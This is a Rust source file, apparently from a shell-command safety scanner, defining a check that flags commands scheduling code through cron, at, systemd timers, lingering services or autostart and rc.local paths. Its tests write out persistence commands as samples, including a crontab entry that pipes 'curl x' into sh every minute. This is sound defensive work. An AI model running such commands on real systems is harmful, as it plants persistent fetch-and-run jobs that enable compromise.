//! Red: schedules code to run later or repeatedly (cron, at, systemd timers, autostart).

use crate::analysis::Flag;
use crate::config::NoConfig;
use crate::model::{Detail, Verdict};
use crate::parser::Command;
use crate::register_flag;

fn base(name: &str) -> &str {
    crate::config::base_name(name)
}

const SCHEDULE_DIRS: &[&str] = &[
    "/etc/cron.d",
    "/etc/cron.daily",
    "/etc/cron.hourly",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
    "/var/spool/cron",
    "/etc/crontab",
    ".config/autostart",
    "/etc/xdg/autostart",
    "/etc/rc.local",
];

pub struct ScheduledTasks {
    reported: bool,
}

fn schedules(c: &Command) -> Option<&'static str> {
    let writes_schedule_dir = c.args.iter().chain(&c.redirects).any(|w| {
        SCHEDULE_DIRS
            .iter()
            .any(|d| w.text.trim_matches(['"', '\'']).contains(d))
    });
    match base(&c.name) {
        // `crontab -`, `crontab file`, but not `crontab -l`.
        "crontab" if !c.has_arg("-l") => Some("a crontab"),
        "at" | "batch" => Some("an at/batch job"),
        "systemd-run" if c.arg_texts().any(|a| a.starts_with("--on-")) => {
            Some("a transient systemd timer")
        }
        "loginctl" if c.has_arg("enable-linger") => {
            Some("lingering user services (run without login)")
        }
        _ if writes_schedule_dir => Some("a scheduled-task file"),
        _ => None,
    }
}

impl Flag for ScheduledTasks {
    fn visit_command(&mut self, c: &Command) -> Verdict {
        let Some(what) = schedules(c).filter(|_| !self.reported) else {
            return Verdict::Ignore;
        };
        self.reported = true;
        Verdict::Red(
            Detail::new(
                format!("installs {what} that runs code on a schedule"),
                "Scheduled jobs keep running long after the installer exits and are a common way to re-fetch a payload or hold persistence.",
            )
            .fix("Confirm the tool genuinely needs a background schedule; malware uses these to survive reboots.")
            .at(c.span.clone()),
        )
    }
}

register_flag! {
    id: "scheduled_tasks",
    kind: Red,
    category: Sensitive,
    description: "Schedules code via cron, at, systemd timers, autostart or rc.local",
    config: NoConfig,
    build: |_cfg, _shared| ScheduledTasks { reported: false },
}

#[cfg(test)]
mod tests {
    #[allow(unused_imports)]
    use super::super::testing::*;

    #[test]
    fn flags_scheduling() {
        assert!(fires(
            "scheduled_tasks",
            "echo '* * * * * curl x|sh' | crontab -"
        ));
        assert!(fires("scheduled_tasks", "at now + 1 minute -f payload"));
        assert!(fires("scheduled_tasks", "echo x > /etc/cron.d/job"));
        assert!(fires(
            "scheduled_tasks",
            "cp job.desktop ~/.config/autostart/job.desktop"
        ));
        assert!(fires(
            "scheduled_tasks",
            "systemd-run --on-calendar=hourly /tmp/x"
        ));
    }

    #[test]
    fn ignores_benign() {
        assert!(!fires("scheduled_tasks", "crontab -l"));
        assert!(!fires("scheduled_tasks", "echo hi"));
    }
}
